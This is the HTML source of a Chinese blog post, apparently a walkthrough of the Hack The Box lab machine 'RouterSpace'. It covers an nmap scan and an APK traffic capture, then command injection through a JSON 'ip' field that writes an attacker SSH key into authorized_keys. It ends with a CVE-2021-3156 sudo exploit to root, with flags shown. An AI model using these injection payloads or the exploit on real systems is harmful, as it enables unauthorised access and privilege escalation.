@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>RouterSpace - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - RouterSpace靶场信息  靶场类型  信息搜集Nmap┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.148 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-02-27 21:16 EST Nmap sc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RouterSpace - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - RouterSpace靶场信息  靶场类型  信息搜集Nmap┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.148 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-02-27 21:16 EST Nmap sc">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/2bc82fdd-8cd4-45f6-a1bc-60f9391dbaee.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/2d4257a6-2709-45f9-af71-fdcad02a3e44.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/46653afc-b6b5-46bd-b82b-c4d45ae3c626.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/1173a543-75e4-4e62-b115-cd4b3febb370.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/dd1602d3-b569-42f1-8a54-59aed067dd37.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/557f8523-19ca-483b-95e1-52bd5f4d8b6b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/4d7193db-f82f-4bd6-8a01-b85d71ecb73a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/9700e06d-20dc-468e-b807-33cf7ba9646d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/ea92e25f-0ed9-41e0-83c1-b347ef997b89.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/aaa685f4-fd92-4728-b005-399d39842443.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/479c2cef-8cec-447e-b854-af1bfaf6830d.png">
+<meta property="article:published_time" content="2022-03-25T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:49:47.248Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/2bc82fdd-8cd4-45f6-a1bc-60f9391dbaee.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">RouterSpace - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">RouterSpace - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-03-25T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-03-25
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-RouterSpace"><span class="post-toc-text">Hackthebox - RouterSpace</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Apk"><span class="post-toc-text">Apk</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-RouterSpace"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">RouterSpace - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-03-25 19:38:36" datetime="2022-03-25T11:38:36.000Z"  itemprop="datePublished">2022-03-25</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-RouterSpace"><a href="#Hackthebox-RouterSpace" class="headerlink" title="Hackthebox - RouterSpace"></a>Hackthebox - RouterSpace</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/2bc82fdd-8cd4-45f6-a1bc-60f9391dbaee.png" class>
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/2d4257a6-2709-45f9-af71-fdcad02a3e44.png" class>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.148
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 21:16 EST
+Nmap scan report for 10.10.11.148
+Host is up (0.28s latency).
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-RouterSpace Packet Filtering V1
+80/tcp open  http
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 200 OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-76343
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 78
+|     ETag: W/&quot;4e-iLIX7S/AlC0nyhqE0lYp8aZLlm4&quot;
+|     Date: Mon, 28 Feb 2022 02:17:00 GMT
+|     Connection: close
+|     Suspicious activity detected !!! {RequestID: j7Q X53 Qp3 9o 7 B2JL }
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-10824
+|     Accept-Ranges: bytes
+|     Cache-Control: public, max-age=0
+|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
+|     ETag: W/&quot;652c-17d476c9285&quot;
+|     Content-Type: text/html; charset=UTF-8
+|     Content-Length: 25900
+|     Date: Mon, 28 Feb 2022 02:16:56 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;
+|     &lt;html class=&quot;no-js&quot; lang=&quot;zxx&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
+|     &lt;title&gt;RouterSpace&lt;/title&gt;
+|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/owl.carousel.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/magnific-popup.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/themify-icons.css&quot;&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-97983
+|     Allow: GET,HEAD,POST
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 13
+|     ETag: W/&quot;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&quot;
+|     Date: Mon, 28 Feb 2022 02:16:57 GMT
+|     Connection: close
+|     GET,HEAD,POST
+|   RTSPRequest, X11Probe: 
+|     HTTP/1.1 400 Bad Request
+|_    Connection: close
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22-TCP:V=7.91%I=7%D=2/27%Time=621C309D%P=x86_64-pc-linux-gnu%r(NULL
+SF:,29,&quot;SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.91%I=7%D=2/27%Time=621C309D%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,13E4,&quot;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\n
+SF:X-Cdn:\x20RouterSpace-10824\r\nAccept-Ranges:\x20bytes\r\nCache-Control
+SF::\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x20202
+SF:1\x2011:33:57\x20GMT\r\nETag:\x20W/\&quot;652c-17d476c9285\&quot;\r\nContent-Type
+SF::\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x
+SF:20Mon,\x2028\x20Feb\x202022\x2002:16:56\x20GMT\r\nConnection:\x20close\
+SF:r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;zxx\&quot;&gt;\n&lt;
+SF:head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20&lt;me
+SF:ta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\x20\
+SF:x20\x20&lt;title&gt;RouterSpace&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;desc
+SF:ription\&quot;\x20content=\&quot;\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\
+SF:x20content=\&quot;width=device-width,\x20initial-scale=1\&quot;&gt;\n\n\x20\x20\x20\
+SF:x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/bootstrap\.min\.css\&quot;&gt;\n\x
+SF:20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/owl\.carousel\.
+SF:min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/
+SF:magnific-popup\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20
+SF:href=\&quot;css/font-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;st
+SF:ylesheet\&quot;\x20href=\&quot;css/themify-icons\.css\&quot;&gt;\n\x20&quot;)%r(HTTPOptions,10
+SF:8,&quot;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20
+SF:RouterSpace-97983\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/h
+SF:tml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\&quot;d-bMedpZ
+SF:YGrVt1nR4x\+qdNZ2GqyRo\&quot;\r\nDate:\x20Mon,\x2028\x20Feb\x202022\x2002:16
+SF::57\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST&quot;)%r(RTSPRequest
+SF:,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
+SF:&quot;)%r(X11Probe,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
+SF:close\r\n\r\n&quot;)%r(FourOhFourRequest,134,&quot;HTTP/1\.1\x20200\x20OK\r\nX-Po
+SF:wered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-76343\r\nContent-Type
+SF::\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2078\r\nETag:\x20W
+SF:/\&quot;4e-iLIX7S/AlC0nyhqE0lYp8aZLlm4\&quot;\r\nDate:\x20Mon,\x2028\x20Feb\x2020
+SF:22\x2002:17:00\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20acti
+SF:vity\x20detected\x20!!!\x20{RequestID:\x20j7Q\x20\x20X53\x20Qp3\x20\x20
+SF:9o\x207\x20\x20\x20B2JL\x20\x20}\n\n\n\n\n&quot;);
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: VoIP adapter|general purpose
+Running: Cisco embedded, Linux 2.6.X
+OS CPE: cpe:/h:cisco:unified_call_manager cpe:/o:linux:linux_kernel:2.6.26
+OS details: Cisco Unified Communications Manager VoIP adapter, Linux 2.6.26 (PCLinuxOS)
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT    ADDRESS
+1   ... 30
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 287.18 seconds
+</code></pre>
+<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>先去看看80端口</p>
+<img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/46653afc-b6b5-46bd-b82b-c4d45ae3c626.png" class>
+
+<p>这似乎是一个公寓的路由管理系统</p>
+<p>先到处看看</p>
+<p>这里右上角Download会下载一个apk包，下载下来后使用模拟器运行然后burp抓包看看</p>
+<h3 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h3><blockquote>
+<p><a href="https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd" target="_blank" rel="noopener">https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd</a></p>
+</blockquote>
+<p>在Debian架构的Linux中安装AnBox模拟器的方法</p>
+<pre><code class="bash">anbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity
+</code></pre>
+<p>安装后以后咱们启动模拟器</p>
+<pre><code class="bash">adb shell settings put global http_proxy 192.168.31.208:8080
+</code></pre>
+<p>然后burp设置好监听端口以后，使用burp对anbox进行代理</p>
+<pre><code class="bash">adb install RouterSpace.apk
+</code></pre>
+<p>安装app，然后打开</p>
+<img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/1173a543-75e4-4e62-b115-cd4b3febb370.png" class>
+
+<p>APK文件运行后就只有一个查看状态的按钮，我们抓包看看</p>
+<img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/dd1602d3-b569-42f1-8a54-59aed067dd37.png" class>
+
+<pre><code class="bash">POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+accept: application/json, text/plain, */*
+user-agent: RouterSpaceAgent
+Content-Type: application/json
+Content-Length: 16
+Host: routerspace.htb
+Connection: close
+Accept-Encoding: gzip, deflate
+
+{&quot;ip&quot;:&quot;0.0.0.0&quot;}
+</code></pre>
+<p>将routerspace.htb加入到hosts</p>
+<pre><code class="bash">echo 10.10.11.148 routerspace.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>抓包下来后是这么个状态，去放包看看</p>
+<img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/557f8523-19ca-483b-95e1-52bd5f4d8b6b.png" class>
+
+<p>这边我有个大胆的想法，看着跟DVWA的命令注入很类似，去测试一下是否可行</p>
+<img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/4d7193db-f82f-4bd6-8a01-b85d71ecb73a.png" class>
+
+<p>成功被执行了，那就好玩了，去构造POC拿shell吧</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/9700e06d-20dc-468e-b807-33cf7ba9646d.png" class>
+
+<p>尝试写入文件，但是无法执行成功</p>
+<p>试试能不能执行命令</p>
+<img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/ea92e25f-0ed9-41e0-83c1-b347ef997b89.png" class>
+
+<p>调用bash也失败了</p>
+<p>然后在&#x2F;home&#x2F;paul&#x2F;.ssh&#x2F;里也没有东西，但是经过测试后，.ssh里可以写入文件</p>
+<img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/aaa685f4-fd92-4728-b005-399d39842443.png" class>
+
+<p>这里突然就有个思路了，生成一个sshkey，然后写入进去就可以ssh登陆了</p>
+<pre><code class="bash">ssh-keygen
+然后全部默认即可生成
+</code></pre>
+<p>然后把id_rsa.pub的内容保存为authorized_keys</p>
+<pre><code class="bash">{&quot;ip&quot;:&quot;0.0.0.0|echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMxVRUf56TSx5tkTab+gCMuO3EFgbMTbNlLOhqEvLiDLcST6zbYl0ofc4cGNguoi6ti6iyi8ZHyS8DjJ89thmpTrDiYXf39Z8QhkO2DaQkzh6FjvvGgY82pVBPtRq1qL0JrnOgqhGBigs3kPbd0kkdmOmDbmV1w1p9omfk2Tj/+q469S+1IVCtQIIvtNuuGTUeTMYQdCfFLOB4OVHBLvAuucIagK2DJrJLgcf0w/DQ/9X04luqhqQET8SfQqBpfn1nq/CcJvXsMlCGqbjE4m6c5l4WIaeAtfrhUdrVukSg0x/r1OJvEm4MgevR7eN/umwGP6yQVH34eBoTHoU6P+H3+9csDAMujbSCWJi3yGK9U5Q7Rei0DsiCrd6T0qbQuCmu4bUdJZfSZCGPCSxO7LRCQlNI13RLRTTUPh6cQn7eB+bnucs/YRgx2/O4b+EDsWGEveXQTpfbJxYLMeespC95v5Rj/vl1C3zqq2nIUIqXC13Y+966+92x4Y6vVmaKDC0= root@kali&#39; &gt; /home/paul/.ssh/authorized_keys&quot;}
+</code></pre>
+<p>然后给700权限</p>
+<pre><code class="bash">{&quot;ip&quot;:&quot;0.0.0.0|chmod 700 /home/paul/.ssh/authorized_keys&quot;}
+</code></pre>
+<p>然后使用ssh进行登陆</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ssh paul@10.10.11.148 -i id_rsa                         
+The authenticity of host &#39;10.10.11.148 (10.10.11.148)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:M4jDfH65U/Fw7jjmKhTZcb9LgW/gi23OjcLjM1bA5UY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.11.148&#39; (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 03 Mar 2022 11:30:25 AM UTC
+
+  System load:           0.07
+  Usage of /:            71.7% of 3.49GB
+  Memory usage:          31%
+  Swap usage:            0%
+  Processes:             214
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.148
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:888d
+
+80 updates can be applied immediately.
+31 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Wed Mar  2 22:54:39 2022 from 10.10.14.27
+paul@routerspace:~$ whoami&amp;&amp;id
+paul
+uid=1001(paul) gid=1001(paul) groups=1001(paul)
+</code></pre>
+<p>成功拿到user权限</p>
+<pre><code class="bash">paul@routerspace:~$ ls
+snap  user.txt
+paul@routerspace:~$ cat user.txt 
+a874812f3d7207b3f4ad32da4bc2bc84
+</code></pre>
+<p>成功拿到user权限的flag文件</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先去跑一个linpeas.sh脚本看看有没有提权点</p>
+<blockquote>
+<p><a href="https://github.com/LucifielHack/linpeas.sh/blob/main/linpeas.sh" target="_blank" rel="noopener">https://github.com/LucifielHack/linpeas.sh/blob/main/linpeas.sh</a></p>
+</blockquote>
+<pre><code class="bash">[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                  
+Sudo version 1.8.31
+</code></pre>
+<p>跑完以后我看到了这么个东西，然后去搜索一下sudo 1.8.31的漏洞</p>
+<img src="/2022/03/25/Hackthebox/Hackthebox-RouterSpace/479c2cef-8cec-447e-b854-af1bfaf6830d.png" class>
+
+<p>这里看到了一个漏洞CVE-2021-3156</p>
+<blockquote>
+<p><a href="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit" target="_blank" rel="noopener">https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit</a></p>
+</blockquote>
+<pre><code class="bash">paul@routerspace:~/Sudo-1.8.31-Root-Exploit$ make
+mkdir libnss_x
+cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
+cc -O3 -o exploit exploit.c
+paul@routerspace:~/Sudo-1.8.31-Root-Exploit$ ./exploit 
+# whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root),1001(paul)
+</code></pre>
+<p>成功拿到root权限的flag文件</p>
+<pre><code class="bash"># cat /root/root.txt
+f3388fc86d949870742895a2c1d6f16e
+</code></pre>
+<p>成功拿到root权限的flag文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/&title=《RouterSpace - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/&title=《RouterSpace - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《RouterSpace - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/03/25/Hackthebox/Hackthebox-Arctic/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Arctic - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/03/10/Hackthebox/Hackthebox-Optimum/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Optimum - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
